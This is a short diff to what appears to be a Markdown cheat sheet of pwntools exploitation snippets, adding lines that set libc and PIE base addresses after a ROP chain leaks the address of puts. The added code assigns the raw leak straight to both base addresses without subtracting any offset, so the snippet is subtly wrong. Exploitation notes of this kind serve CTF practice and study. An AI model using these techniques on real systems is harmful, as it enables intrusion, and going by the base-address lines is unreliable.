@@ -153,6 +153,13 @@ payload += pop_rdi + got_puts + plt_puts
 leak = u64(p.recvline().strip().ljust(8,b'\0'))
 print("puts {}".format(str(hex(leak))))
 ```
+Setting base addresses
+```python
+# libc base address
+libc.address = leak
+# PIE base address
+elf.address = leak 
+```
 others
 ```python
 # example payload converter func
